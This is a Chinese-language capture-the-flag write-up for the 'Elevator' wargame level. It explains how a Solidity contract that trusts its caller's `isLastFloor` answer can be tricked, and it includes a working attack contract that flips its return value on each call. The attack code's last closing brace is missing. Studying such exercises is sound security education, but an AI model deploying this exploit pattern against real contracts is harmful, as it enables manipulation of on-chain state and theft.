### 第十一关 Elevator
### 难度2/5
## 这一关的通关条件是把top变为true。
## 代码如下：
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Building {
    function isLastFloor(uint256) external returns (bool);
}

contract Elevator {
    bool public top;
    uint256 public floor;

    function goTo(uint256 _floor) public {
        Building building = Building(msg.sender);

        if (!building.isLastFloor(_floor)) {
            floor = _floor;
            top = building.isLastFloor(floor);
        }
    }
}
```
代码分为两部分，第一部分是个接口，第二部分是合约，合约里只有一个函数。注意看函数里的if条件，首先判断building.isLastFloor(_floor)为false才能进入下面的逻辑，但是最后top总是会被赋值为false。乍一看，好像top永远都不会变为true。但是分析一下，isLastFloor是通过接口调用的，而且这个接口的定义与实现全凭我们随心所欲。所以我们的接口只要满足以下条件就行：
- 有isLastFloor函数
- 输入参数一个uint256的值
- 返回一个bool值以
- 每调用一次返回值便会在0和1之间翻转，这样就可以确保在goTo函数里，if判断能进去，再次调用的时候top也能变为true。
## 解题步骤：
1. 打开remix，写攻击合约，goTo参数随便送一个数字即可，我喜欢3，送入3:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator{
    function goTo(uint256 _floor) external;
}

contract Building{
    
    bool public isTop = true;

    address hackedAddress;
    constructor(address _hackedAddress){
        hackedAddress = _hackedAddress;
   }

    function isLastFloor(uint) external returns (bool) {
        isTop = !isTop; 
        return isTop;
    }

   function attack() public {
        IElevator(hackedAddress).goTo(3);
    }
```
2. 运行合约，部署，调用attack函数。
3. 提交过关。
